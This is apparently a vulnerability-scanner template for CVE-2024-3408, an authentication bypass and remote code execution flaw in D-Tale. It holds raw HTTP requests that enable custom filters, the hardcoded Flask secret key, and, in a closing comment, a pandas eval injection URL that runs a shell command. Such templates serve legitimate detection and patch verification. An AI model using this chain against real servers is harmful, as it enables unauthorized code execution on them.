id: CVE-2024-3408

info:
  name: D-Tale <= 3.10.0 - Authentication Bypass & Remote Code Execution
  author: solari
  severity: critical
  description: |
    D-Tale version 3.10.0 and earlier contains a hardcoded Flask SECRET_KEY ('Dtale')
    that allows attackers to forge session cookies and bypass authentication. Combined
    with the ability to enable custom filters via global state manipulation, this leads
    to remote code execution through the /test-filter endpoint using pandas eval injection.
  impact: |
    Unauthenticated attackers can execute arbitrary code on the server hosting D-Tale.
  remediation: |
    Upgrade to D-Tale version 3.11.0 or later which addresses the hardcoded secret key issue.
  reference:
    - https://huntr.com/bounties/57a06666-ff85-4577-af19-f3dfb7b02f91
    - https://nvd.nist.gov/vuln/detail/CVE-2024-3408
    - https://github.com/man-group/dtale
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-3408
    cwe-id: CWE-798,CWE-94
  metadata:
    max-request: 2
    vendor: man-group
    product: dtale
    shodan-query: title:"D-Tale"
    fofa-query: title="D-Tale"
  tags: cve,cve2024,dtale,rce,auth-bypass,flask

http:
  - raw:
      - |
        GET /dtale/popup/upload HTTP/1.1
        Host: {{Hostname}}

      - |
        POST /dtale/update-settings/1 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        Cookie: session={{session_cookie}}

        {"enable_custom_filters":true}

    matchers-condition: and
    matchers:
      - type: word
        part: body_1
        words:
          - "D-Tale"
          - "dtale"
        condition: or

      - type: status
        status:
          - 200

    extractors:
      - type: kval
        part: header_1
        kval:
          - set_cookie
        internal: true
        name: session_cookie

# Note: Actual exploitation requires:
# 1. Forging session cookie using Flask's SECRET_KEY ('Dtale')
# 2. Enabling custom_filters via /dtale/update-settings
# 3. Executing code via /dtale/test-filter endpoint with pandas eval() injection
# Example: /dtale/test-filter/1?query=@pd.core.frame.com.builtins.__import__('os').system('id')
